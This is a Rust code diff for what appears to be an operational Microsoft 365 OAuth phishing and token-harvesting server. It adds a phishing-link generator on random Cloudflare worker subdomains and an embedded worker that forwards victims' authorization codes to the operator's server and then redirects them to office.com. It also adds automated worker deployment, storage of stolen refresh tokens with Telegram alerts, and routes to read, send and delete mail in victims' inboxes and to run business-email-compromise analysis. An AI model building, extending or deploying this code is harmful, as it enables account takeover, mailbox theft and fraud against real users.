@@ -48,6 +48,12 @@ use settings::{get_ai_settings_handler, save_ai_settings_handler, test_decrypt_h
 mod auth;
 use auth::{register_handler, login_handler, me_handler, ensure_users_table, seed_default_admin};
 
+mod bec;
+use bec::bec_analyze_handler;
+
+mod inbox_folders;
+use inbox_folders::{list_folders_handler, folder_messages_handler, create_folder_handler, send_mail_handler, delete_message_handler};
+
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
 pub struct AppConfig {
@@ -100,6 +106,34 @@ pub struct AppState {
     http_client: Client,
     vault: Vault,
     response_key: [u8; 32],
+}
+
+/// Retrieve token from vault (tokens table) or fall back to harvested table.
+pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Result<vault::DecryptedToken> {
+    // First try vault (encrypted tokens table)
+    if let Ok(token) = state.vault.retrieve_token(&state.pool, token_id).await {
+        return Ok(token);
+    }
+    // Fall back to harvested table (legacy plain-text storage)
+    let row: HarvestedToken = sqlx::query_as(
+        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?"
+    )
+    .bind(token_id)
+    .fetch_one(&state.pool)
+    .await
+    .map_err(|e| anyhow::anyhow!("Token not found in any storage: {}", e))?;
+
+    Ok(vault::DecryptedToken {
+        id: row.id,
+        campaign_id: "harvested".to_string(),
+        user_email: row.email.unwrap_or_default(),
+        access_token: row.access_token,
+        refresh_token: row.refresh_token,
+        scopes: vec![],
+        expires_at: row.expires_at,
+        created_at: row.captured_at,
+        last_refreshed_at: None,
+    })
 }
 
 fn generate_id() -> String {
@@ -216,9 +250,13 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
             if let (Some(access_token), Some(refresh_token)) = (body.get("access_token").and_then(|v| v.as_str()), body.get("refresh_token").and_then(|v| v.as_str())) {
                 let id = generate_id();
                 let expires_in = body.get("expires_in").and_then(|v| v.as_i64()).unwrap_or(3600);
-                let expires_at = Utc::now() + Duration::seconds(expires_in);
+                let _expires_at = Utc::now() + Duration::seconds(expires_in);
+                // Set refresh token expiry to 90 days for Microsoft confidential clients
+                let refresh_expires_at = Utc::now() + Duration::days(90);
                 let email = fetch_user_email(access_token).await;
-                println!("Attempting to insert token for email: {:?}", email);  // <-- moved here
+                let email_str = email.clone().unwrap_or_else(|| "unknown".to_string());
+                println!("Attempting to insert token for email: {:?}", email);
+                // Store in harvested table (legacy, for dashboard display)
                 sqlx::query(
                     "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source) VALUES (?, ?, ?, ?, ?, ?, ?)"
                 )
@@ -226,12 +264,22 @@ async fn exchange_code(query: web::Query<ExchangeQuery>, state: web::Data<AppSta
                 .bind(&email)
                 .bind(access_token)
                 .bind(refresh_token)
-                .bind(expires_at)
+                .bind(refresh_expires_at)
                 .bind(Utc::now())
                 .bind("oauth_app")
                 .execute(&state.pool)
                 .await
                 .ok();
+                // Also store in encrypted tokens table (for scheduler refresh, BEC, recon, etc.)
+                let _ = state.vault.store_token(
+                    &state.pool,
+                    &id,
+                    &email_str,
+                    access_token,
+                    refresh_token,
+                    vec!["openid".to_string(), "offline_access".to_string(), "User.Read".to_string(), "Mail.Read".to_string()],
+                    refresh_expires_at,
+                ).await;
                 if let Some(email) = email {
                     send_telegram_notification(&state.config, refresh_token, &email).await;
                 }
@@ -267,6 +315,45 @@ async fn api_token_by_id(
         }
         Err(_) => HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
     }
+}
+
+#[derive(Deserialize)]
+struct DeleteTokensRequest {
+    token_ids: Vec<String>,
+}
+
+// JSON API: batch delete tokens
+async fn api_delete_tokens(
+    body: web::Json<DeleteTokensRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let mut deleted_harvested = 0u64;
+    let mut deleted_vault = 0u64;
+
+    for id in &body.token_ids {
+        let r1 = sqlx::query("DELETE FROM harvested WHERE id = ?")
+            .bind(id)
+            .execute(&state.pool)
+            .await;
+        if let Ok(r) = r1 {
+            deleted_harvested += r.rows_affected();
+        }
+
+        let r2 = sqlx::query("DELETE FROM tokens WHERE id = ?")
+            .bind(id)
+            .execute(&state.pool)
+            .await;
+        if let Ok(r) = r2 {
+            deleted_vault += r.rows_affected();
+        }
+    }
+
+    HttpResponse::Ok().json(serde_json::json!({
+        "success": true,
+        "deleted": deleted_harvested + deleted_vault,
+        "deleted_harvested": deleted_harvested,
+        "deleted_vault": deleted_vault,
+    }))
 }
 
 #[derive(Serialize)]
@@ -311,7 +398,7 @@ async fn tokens_health(state: web::Data<AppState>) -> impl Responder {
 
 // JSON API: get inbox emails for a token
 #[derive(Deserialize)]
-struct InboxApiQuery {
+pub struct InboxApiQuery {
     token_id: String,
 }
 
@@ -356,6 +443,166 @@ async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>)
         }
     } else {
         HttpResponse::NotFound().json(serde_json::json!({"error": "Token not found"}))
+    }
+}
+
+// Generate a random OAuth link with random worker subdomain
+#[derive(Serialize)]
+struct GenerateOAuthLinkResponse {
+    link: String,
+    worker_subdomain: String,
+}
+
+async fn generate_oauth_link(state: web::Data<AppState>) -> impl Responder {
+    let subdomain: String = rand::thread_rng()
+        .sample_iter(&rand::distributions::Alphanumeric)
+        .take(12)
+        .map(char::from)
+        .collect::<String>()
+        .to_lowercase();
+
+    let worker_url = format!("https://{}-simdiatokens-oauth.lubaking-co.workers.dev", subdomain);
+    let redirect_uri = format!("{}/oauth/callback", worker_url);
+
+    let scopes = "openid%20offline_access%20User.Read%20Mail.Read";
+    let state_param: String = rand::thread_rng()
+        .sample_iter(&rand::distributions::Alphanumeric)
+        .take(16)
+        .map(char::from)
+        .collect();
+
+    let link = format!(
+        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={}&response_type=code&redirect_uri={}&scope={}&state={}&response_mode=query",
+        state.config.client_id,
+        redirect_uri,
+        scopes,
+        state_param
+    );
+
+    HttpResponse::Ok().json(GenerateOAuthLinkResponse {
+        link,
+        worker_subdomain: subdomain,
+    })
+}
+
+// Embedded worker script for deployment
+const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    const MAIN_SERVER = env.MAIN_SERVER || 'https://simdiatokens-server-production.up.railway.app';
+    const CLIENT_ID = env.CLIENT_ID || '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
+    const REDIRECT_URI = env.REDIRECT_URI || 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
+    const SCOPE = 'openid offline_access User.Read Mail.Read Files.ReadWrite.All';
+
+    if (url.pathname === '/start') {
+      const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
+      return Response.redirect(authUrl, 302);
+    }
+
+    if (url.pathname === '/oauth/callback') {
+      const code = url.searchParams.get('code');
+      if (!code) return new Response('Missing authorization code', { status: 400 });
+      const exchangeUrl = `${MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
+      try { await fetch(exchangeUrl, { method: 'GET' }); } catch (err) { console.error(err); }
+      return Response.redirect('https://www.office.com', 302);
+    }
+
+    if (url.pathname === '/status') {
+      return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: MAIN_SERVER, redirect_uri: REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
+    }
+
+    return new Response('Not Found', { status: 404 });
+  },
+};
+"#;
+
+#[derive(Serialize)]
+struct DeployWorkerResponse {
+    success: bool,
+    worker_url: String,
+    message: String,
+}
+
+// Deploy worker to Cloudflare using their REST API
+async fn deploy_worker(state: web::Data<AppState>) -> impl Responder {
+    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
+        Ok(v) => v,
+        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
+            "success": false,
+            "message": "CF_ACCOUNT_ID env var not set"
+        })),
+    };
+    let cf_api_token = match env::var("CF_API_TOKEN") {
+        Ok(v) => v,
+        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
+            "success": false,
+            "message": "CF_API_TOKEN env var not set"
+        })),
+    };
+
+    let script_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
+    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
+
+    let main_server = format!("https://{}", env::var("RAILWAY_PUBLIC_DOMAIN")
+        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
+        .unwrap_or_else(|_| "simdiatokens-v2-production.up.railway.app".to_string()));
+
+    let redirect_uri = format!("https://{}.{}/oauth/callback", script_name, workers_subdomain);
+
+    // Build metadata with text bindings
+    let metadata = serde_json::json!({
+        "bindings": [
+            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
+            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
+            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
+        ]
+    });
+
+    let url = format!(
+        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
+        cf_account_id, script_name
+    );
+
+    let form = reqwest::multipart::Form::new()
+        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
+            .mime_str("application/json").unwrap())
+        .part("index.js", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
+            .mime_str("application/javascript+module").unwrap());
+
+    let res = match state.http_client
+        .put(&url)
+        .header("Authorization", format!("Bearer {}", cf_api_token))
+        .multipart(form)
+        .send()
+        .await
+    {
+        Ok(r) => r,
+        Err(e) => {
+            eprintln!("[deploy] Cloudflare API request failed: {}", e);
+            return HttpResponse::InternalServerError().json(serde_json::json!({
+                "success": false,
+                "message": format!("Cloudflare API request failed: {}", e)
+            }));
+        }
+    };
+
+    let status = res.status();
+    let body_text = res.text().await.unwrap_or_default();
+
+    if status.is_success() {
+        let worker_url = format!("https://{}.{}", script_name, workers_subdomain);
+        HttpResponse::Ok().json(DeployWorkerResponse {
+            success: true,
+            worker_url,
+            message: "Worker deployed successfully".to_string(),
+        })
+    } else {
+        eprintln!("[deploy] Cloudflare API error {}: {}", status, body_text);
+        HttpResponse::InternalServerError().json(serde_json::json!({
+            "success": false,
+            "message": format!("Cloudflare API returned {}: {}", status, body_text)
+        }))
     }
 }
 
@@ -664,6 +911,7 @@ async fn main() -> std::io::Result<()> {
             .route("/admin", web::get().to(admin_dashboard))
             .route("/inbox_view", web::get().to(inbox_view_html))
             .route("/api/tokens", web::get().to(api_tokens))
+            .route("/api/tokens", web::delete().to(api_delete_tokens))
             .route("/api/tokens/{id}", web::get().to(api_token_by_id))
             .route("/api/tokens/store", web::post().to(store_token_handler))
             .route("/api/tokens/health", web::get().to(tokens_health))
@@ -675,6 +923,8 @@ async fn main() -> std::io::Result<()> {
             .route("/api/ai/analyses", web::get().to(ai_analyses_handler))
             .route("/api/ai/analyze", web::post().to(ai_analyze_handler))
             .route("/api/stealth/config", web::get().to(stealth_config_handler))
+            .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
+            .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
             .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
@@ -690,6 +940,13 @@ async fn main() -> std::io::Result<()> {
             .route("/api/auth/register", web::post().to(register_handler))
             .route("/api/auth/login", web::post().to(login_handler))
             .route("/api/auth/me", web::get().to(me_handler))
+            .route("/api/auth/change-password", web::post().to(auth::change_password_handler))
+            .route("/api/bec/analyze", web::get().to(bec_analyze_handler))
+            .route("/api/inbox/folders", web::get().to(list_folders_handler))
+            .route("/api/inbox/folders", web::post().to(create_folder_handler))
+            .route("/api/inbox/folders/{folder_id}", web::get().to(folder_messages_handler))
+            .route("/api/inbox/send", web::post().to(send_mail_handler))
+            .route("/api/inbox/messages/{message_id}", web::delete().to(delete_message_handler))
     })
     .bind(("0.0.0.0", port))?
     .run()
